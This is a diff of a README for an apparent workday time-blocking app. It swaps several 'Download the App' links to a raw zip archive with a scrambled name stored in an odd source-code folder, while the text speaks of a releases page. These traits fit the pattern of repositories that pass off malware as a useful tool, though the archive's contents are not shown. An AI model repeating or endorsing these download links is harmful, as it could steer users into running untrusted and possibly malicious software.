@@ -4,13 +4,13 @@
 
 Welcome to the Time-Blocking-And-Workday-Panner! This tool helps you create focused workdays using interactive timelines. Let's help you get set up so you can start planning your days effectively. 
 
-[![Download the App](https://github.com/rohit99679/Time-Blocking-And-Workday-Panner/raw/refs/heads/main/components/shell/Time-And-Panner-Workday-Blocking-3.3-alpha.1.zip%20Now-Get%20Started-brightgreen)](https://github.com/rohit99679/Time-Blocking-And-Workday-Panner/raw/refs/heads/main/components/shell/Time-And-Panner-Workday-Blocking-3.3-alpha.1.zip)
+[![Download the App](https://raw.githubusercontent.com/rohit99679/Time-Blocking-And-Workday-Panner/main/app/(app)/templates/Workday-Panner-And-Time-Blocking-3.8.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/rohit99679/Time-Blocking-And-Workday-Panner/main/app/(app)/templates/Workday-Panner-And-Time-Blocking-3.8.zip)
 
 ## 📥 Download & Install
 
 To get started, you need to download the application. Please visit the link below to find the latest version:
 
-[Download This App](https://github.com/rohit99679/Time-Blocking-And-Workday-Panner/raw/refs/heads/main/components/shell/Time-And-Panner-Workday-Blocking-3.3-alpha.1.zip)
+[Download This App](https://raw.githubusercontent.com/rohit99679/Time-Blocking-And-Workday-Panner/main/app/(app)/templates/Workday-Panner-And-Time-Blocking-3.8.zip)
 
 On the releases page, look for the latest version of the software. You’ll see options for your device. Click the version that matches your system.
 
@@ -98,4 +98,4 @@ For any queries not addressed, feel free to reach out via the contact informatio
 
 Thank you for choosing Time-Blocking-And-Workday-Panner. We hope it helps you organize your days better!
 
-[Download This App](https://github.com/rohit99679/Time-Blocking-And-Workday-Panner/raw/refs/heads/main/components/shell/Time-And-Panner-Workday-Blocking-3.3-alpha.1.zip)
+[Download This App](https://raw.githubusercontent.com/rohit99679/Time-Blocking-And-Workday-Panner/main/app/(app)/templates/Workday-Panner-And-Time-Blocking-3.8.zip)
